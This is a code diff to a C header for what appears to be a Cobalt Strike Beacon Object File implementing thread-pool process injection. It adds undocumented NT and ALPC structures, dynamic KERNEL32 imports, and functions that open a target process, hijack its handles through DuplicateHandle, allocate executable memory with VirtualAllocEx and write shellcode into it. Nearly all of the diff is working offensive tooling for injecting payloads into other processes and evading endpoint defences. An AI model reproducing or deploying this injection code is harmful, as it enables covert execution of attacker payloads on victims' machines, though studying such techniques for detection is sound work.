@@ -1,7 +1,10 @@
 #pragma once
 
 #include <windows.h>
+#include "beacon.h"
+#include <stdint.h>
 
+#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
 #define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
 #define WORKER_FACTORY_RELEASE_WORKER 0x0001
 #define WORKER_FACTORY_WAIT 0x0002
@@ -27,7 +30,7 @@ typedef struct _UNICODE_STRING {
     USHORT Length;
     USHORT MaximumLength;
     PWSTR  Buffer;
-} UNICODE_STRING;
+} UNICODE_STRING, *PUNICODE_STRING;
 
 
 typedef struct _TP_TASK_CALLBACKS
@@ -460,3 +463,293 @@ typedef NTSTATUS(NTAPI* _NtQueryInformationWorkerFactory)(
     ULONG WorkerFactoryInformationLength,
     PULONG ReturnLength
     );
+
+typedef NTSTATUS(NTAPI* _ZwSetIoCompletion)(
+    HANDLE IoCompletionHandle,
+    PVOID KeyContext,
+    PVOID ApcContext,
+    NTSTATUS IoStatus,
+    ULONG_PTR IoStatusInformation
+);
+
+typedef struct _FULL_TP_JOB
+{
+    struct _TP_DIRECT Direct;
+    struct _TPP_CLEANUP_GROUP_MEMBER CleanupGroupMember;
+    void* JobHandle;
+    union
+    {
+        volatile int64_t CompletionState;
+        int64_t Rundown : 1;
+        int64_t CompletionCount : 63;
+    };
+    struct _RTL_SRWLOCK RundownLock;
+} FULL_TP_JOB, * PFULL_TP_JOB;
+
+typedef NTSTATUS (NTAPI* _TpAllocJobNotification)(
+    PFULL_TP_JOB* JobReturn,
+    HANDLE HJob,
+    PVOID Callback,
+    PVOID Context,
+    PTP_CALLBACK_ENVIRON CallbackEnviron
+);
+
+typedef struct _OBJECT_ATTRIBUTES
+{
+    ULONG Length;
+    HANDLE RootDirectory;
+    PUNICODE_STRING ObjectName;
+    ULONG Attributes;
+    PVOID SecurityDescriptor;
+    PVOID SecurityQualityOfService;
+} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
+
+typedef struct _ALPC_PORT_ATTRIBUTES
+{
+    ULONG Flags;
+    SECURITY_QUALITY_OF_SERVICE SecurityQos;
+    SIZE_T MaxMessageLength;
+    SIZE_T MemoryBandwidth;
+    SIZE_T MaxPoolUsage;
+    SIZE_T MaxSectionSize;
+    SIZE_T MaxViewSize;
+    SIZE_T MaxTotalSectionSize;
+    ULONG DupObjectTypes;
+#ifdef _WIN64
+    ULONG Reserved;
+#endif
+} ALPC_PORT_ATTRIBUTES, * PALPC_PORT_ATTRIBUTES;
+
+
+typedef NTSTATUS(NTAPI *_NtAlpcCreatePort)(
+    PHANDLE PortHandle,
+    POBJECT_ATTRIBUTES ObjectAttributes,
+    PALPC_PORT_ATTRIBUTES PortAttributes
+);
+
+typedef struct _TP_ALPC TP_ALPC, * PTP_ALPC;
+
+typedef VOID(NTAPI* PTP_ALPC_CALLBACK)(
+    PTP_CALLBACK_INSTANCE Instance,
+    PVOID Context,
+    PTP_ALPC Alpc
+);
+
+typedef NTSTATUS( NTAPI* _TpAllocAlpcCompletion)(
+    PFULL_TP_ALPC* AlpcReturn,
+    HANDLE AlpcPort,
+    PTP_ALPC_CALLBACK Callback,
+    PVOID Context,
+    PTP_CALLBACK_ENVIRON CallbackEnviron
+);
+
+typedef struct _ALPC_PORT_ASSOCIATE_COMPLETION_PORT
+{
+    PVOID CompletionKey;
+    HANDLE CompletionPort;
+} ALPC_PORT_ASSOCIATE_COMPLETION_PORT, * PALPC_PORT_ASSOCIATE_COMPLETION_PORT;
+
+// private
+typedef enum _ALPC_PORT_INFORMATION_CLASS
+{
+    AlpcBasicInformation, // q: out ALPC_BASIC_INFORMATION
+    AlpcPortInformation, // s: in ALPC_PORT_ATTRIBUTES
+    AlpcAssociateCompletionPortInformation, // s: in ALPC_PORT_ASSOCIATE_COMPLETION_PORT
+    AlpcConnectedSIDInformation, // q: in SID
+    AlpcServerInformation, // q: inout ALPC_SERVER_INFORMATION
+    AlpcMessageZoneInformation, // s: in ALPC_PORT_MESSAGE_ZONE_INFORMATION
+    AlpcRegisterCompletionListInformation, // s: in ALPC_PORT_COMPLETION_LIST_INFORMATION
+    AlpcUnregisterCompletionListInformation, // s: VOID
+    AlpcAdjustCompletionListConcurrencyCountInformation, // s: in ULONG
+    AlpcRegisterCallbackInformation, // s: ALPC_REGISTER_CALLBACK // kernel-mode only
+    AlpcCompletionListRundownInformation, // s: VOID // 10
+    AlpcWaitForPortReferences,
+    AlpcServerSessionInformation // q: ALPC_SERVER_SESSION_INFORMATION // since 19H2
+} ALPC_PORT_INFORMATION_CLASS;
+
+
+typedef NTSTATUS (NTAPI* _NtAlpcSetInformation)(
+    HANDLE PortHandle,
+    ALPC_PORT_INFORMATION_CLASS PortInformationClass,
+    PVOID PortInformation,
+    ULONG Length
+);
+
+typedef struct _CLIENT_ID
+{
+    HANDLE UniqueProcess;
+    HANDLE UniqueThread;
+} CLIENT_ID, * PCLIENT_ID;
+
+
+typedef struct _PORT_MESSAGE
+{
+    union
+    {
+        struct
+        {
+            USHORT DataLength;
+            USHORT TotalLength;
+        } s1;
+        ULONG Length;
+    } u1;
+    union
+    {
+        struct
+        {
+            USHORT Type;
+            USHORT DataInfoOffset;
+        } s2;
+        ULONG ZeroInit;
+    } u2;
+    union
+    {
+        CLIENT_ID ClientId;
+        double DoNotUseThisField;
+    };
+    ULONG MessageId;
+    union
+    {
+        SIZE_T ClientViewSize; // only valid for LPC_CONNECTION_REQUEST messages
+        ULONG CallbackId; // only valid for LPC_REQUEST messages
+    };
+} PORT_MESSAGE, * PPORT_MESSAGE;
+typedef struct _ALPC_MESSAGE {
+    PORT_MESSAGE PortHeader;
+    BYTE PortMessage[1000];
+} ALPC_MESSAGE, * PALPC_MESSAGE;
+
+typedef struct _ALPC_MESSAGE_ATTRIBUTES
+{
+    ULONG AllocatedAttributes;
+    ULONG ValidAttributes;
+} ALPC_MESSAGE_ATTRIBUTES, * PALPC_MESSAGE_ATTRIBUTES;
+
+typedef NTSTATUS (NTAPI* _NtAlpcConnectPort)(
+    PHANDLE PortHandle,
+    PUNICODE_STRING PortName,
+    POBJECT_ATTRIBUTES ObjectAttributes,
+    PALPC_PORT_ATTRIBUTES PortAttributes,
+    ULONG Flags,
+    PSID RequiredServerSid,
+    PPORT_MESSAGE ConnectionMessage,
+    PSIZE_T BufferLength,
+    PALPC_MESSAGE_ATTRIBUTES OutMessageAttributes,
+    PALPC_MESSAGE_ATTRIBUTES InMessageAttributes,
+    PLARGE_INTEGER Timeout
+);
+
+
+// 
+// COMMON SHIT
+//
+WINBASEAPI int WINAPI MSVCRT$rand(void);
+WINBASEAPI void WINAPI MSVCRT$srand(unsigned int seed);
+WINBASEAPI time_t WINAPI MSVCRT$time(time_t *seconds);
+WINBASEAPI void *__cdecl MSVCRT$realloc(void *_Memory, size_t _NewSize);
+WINBASEAPI wchar_t *__cdecl MSVCRT$wcscmp(const wchar_t *_lhs,const wchar_t *_rhs);
+WINBASEAPI errno_t __cdecl MSVCRT$wcscpy_s(wchar_t *_Dst, rsize_t _DstSize, const wchar_t *_Src);
+WINBASEAPI errno_t __cdecl MSVCRT$wcscat_s(wchar_t *_Dst, rsize_t _DstSize, const wchar_t *_Src);
+WINBASEAPI void* WINAPI MSVCRT$malloc(size_t size);
+WINBASEAPI size_t __cdecl MSVCRT$wcslen(const wchar_t *_Str);
+WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentProcess (VOID);
+WINBASEAPI BOOL WINAPI KERNEL32$DuplicateHandle(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions);
+WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
+WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess (DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwProcessId);
+WINBASEAPI BOOL WINAPI KERNEL32$WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
+WINBASEAPI PTP_TIMER  WINAPI KERNEL32$CreateThreadpoolTimer( PTP_TIMER_CALLBACK pfnti, PVOID pv, PTP_CALLBACK_ENVIRON pcbe);
+WINBASEAPI BOOL WINAPI KERNEL32$SetInformationJobObject(HANDLE hJob, JOBOBJECTINFOCLASS JobObjectInformationClass, LPVOID lpJobObjectInformation, DWORD cbJobObjectInformationLength);
+WINBASEAPI BOOL WINAPI KERNEL32$AssignProcessToJobObject(HANDLE hJob, HANDLE hProcess);
+WINBASEAPI HANDLE WINAPI KERNEL32$CreateJobObjectA(LPSECURITY_ATTRIBUTES lpJobAttributes, LPCSTR lpName);
+
+HANDLE m_p_hTargetPid = NULL;
+DWORD m_dwTargetPid = 0;
+PVOID m_ShellcodeAddress = NULL;
+unsigned char * m_cShellcode = NULL;
+int m_szShellcodeSize = 0;
+
+BYTE* NtQueryObject_(HANDLE x, OBJECT_INFORMATION_CLASS y) {
+    _NtQueryObject NtQueryObject = (_NtQueryObject)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryObject"));
+    ULONG InformationLength = 0;
+    NTSTATUS Ntstatus = STATUS_INFO_LENGTH_MISMATCH;
+    BYTE* Information = NULL;
+
+    do {
+        Information = (BYTE*)MSVCRT$realloc(Information, InformationLength);
+        Ntstatus = NtQueryObject(x, y, Information, InformationLength, &InformationLength);
+    } while (STATUS_INFO_LENGTH_MISMATCH == Ntstatus);
+
+    return Information;
+}
+
+HANDLE HijackProcessHandle(PWSTR wsObjectType ,HANDLE p_hTarget, DWORD dwDesiredAccess) {
+    _NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess"));
+    
+    BYTE* Information = NULL;
+    ULONG InformationLength = 0;
+    NTSTATUS Ntstatus = STATUS_INFO_LENGTH_MISMATCH;
+
+    do {
+        Information = (BYTE*)MSVCRT$realloc(Information, InformationLength);
+        Ntstatus = NtQueryInformationProcess(p_hTarget, (PROCESSINFOCLASS)(ProcessHandleInformation), Information, InformationLength, &InformationLength);
+    } while (STATUS_INFO_LENGTH_MISMATCH == Ntstatus);
+    
+    
+    PPROCESS_HANDLE_SNAPSHOT_INFORMATION pProcessHandleInformation = (PPROCESS_HANDLE_SNAPSHOT_INFORMATION)(Information);
+    
+    HANDLE p_hDuplicatedObject;
+    ULONG InformationLength_ = 0;
+
+    for (int i = 0; i < pProcessHandleInformation->NumberOfHandles; i++) {
+        KERNEL32$DuplicateHandle(
+            p_hTarget,
+            pProcessHandleInformation->Handles[i].HandleValue,
+            KERNEL32$GetCurrentProcess(), 
+            &p_hDuplicatedObject,
+            dwDesiredAccess,
+            FALSE,
+            (DWORD_PTR)NULL);
+
+        BYTE* pObjectInformation;
+        pObjectInformation = NtQueryObject_(p_hDuplicatedObject, ObjectTypeInformation);
+        PPUBLIC_OBJECT_TYPE_INFORMATION pObjectTypeInformation = (PPUBLIC_OBJECT_TYPE_INFORMATION)(pObjectInformation);
+
+        if (MSVCRT$wcscmp(wsObjectType, pObjectTypeInformation->TypeName.Buffer) != 0) {
+            continue;
+        }
+
+        return p_hDuplicatedObject;
+    }
+}
+
+LPVOID AllocateShellcodeMemory() {
+    LPVOID ShellcodeAddress = KERNEL32$VirtualAllocEx(m_p_hTargetPid, NULL, m_szShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (ShellcodeAddress == NULL) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[INFO]   Something went wrong");
+        return NULL;
+    }
+    BeaconPrintf(CALLBACK_OUTPUT, "[INFO]   Allocated shellcode memory in the target process: %p", ShellcodeAddress);
+    return ShellcodeAddress;
+}
+
+HANDLE GetTargetProcessHandle() {
+    HANDLE p_hTargetPid = KERNEL32$OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, m_dwTargetPid);
+    if (p_hTargetPid == NULL) {
+        return NULL;
+    }
+    else {
+        BeaconPrintf(CALLBACK_OUTPUT, "[INFO]   Retrieved handle to the target process: %p", p_hTargetPid);
+        return p_hTargetPid;
+    }
+}
+
+BOOL WriteShellcode() {
+    BOOL res = KERNEL32$WriteProcessMemory(m_p_hTargetPid, m_ShellcodeAddress, m_cShellcode, m_szShellcodeSize, NULL);
+    if (res == 0) {
+        return FALSE;
+    }
+    else{
+        BeaconPrintf(CALLBACK_OUTPUT, "[INFO]   Written shellcode to the target process");
+        return TRUE;
+    }
+}
